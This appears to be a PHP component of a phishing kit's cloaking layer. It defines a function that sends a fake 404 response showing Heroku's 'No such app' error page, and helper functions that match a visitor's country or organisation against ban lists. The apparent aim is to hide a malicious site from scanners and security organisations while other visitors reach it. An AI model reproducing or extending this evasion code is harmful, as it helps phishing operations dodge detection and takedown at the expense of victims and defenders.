<?php
require_once __DIR__ .'/Mobile_Detect.php';
require_once __DIR__ .'/detect.php';

function cloneWeb(){
	 header('HTTP/1.0 404 Not Found', true, 404);
	 echo '<!DOCTYPE html>
<html>
	<head>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta charset="utf-8">
	<title>No such app</title>
	<style media="screen">
		html,body,iframe {
		margin: 0;
		padding: 0;
		}
		html,body {
		height: 100%;
		overflow: hidden;
		}
		iframe {
		width: 100%;
		height: 100%;
		border: 0;
		}
	</style>
	</head>
	<body>
	<iframe src="//www.herokucdn.com/error-pages/no-such-app.html"></iframe>
	</body>
</html>';
	 exit();
}

function banned_country($country_code, $csv_banned){
	$banned_countries = explode('|', $csv_banned);
	if(in_array($country_code, $banned_countries))
		return true;
	else
		return false;
}
function banned_countryName($country_name, $csv_banned){
	$banned_countries = explode('|', $csv_banned);
	if(in_array($country_name, $banned_countries))
		return true;
	else
		return false;
}
function banned_org($organisation_name, $csv_banned){
	$banned_orgs = explode('|', $csv_banned);
	foreach($banned_orgs as $banned_org){

			if(contains($banned_org,$organisation_name)) {
				return true;
				break;
			}
		if($banned_org == $organisation_name){
			return true;
			break;
		}
	}
	return false;
}
function contains($needle, $haystack){
    return strpos($haystack, $needle) !== false;
}
?>
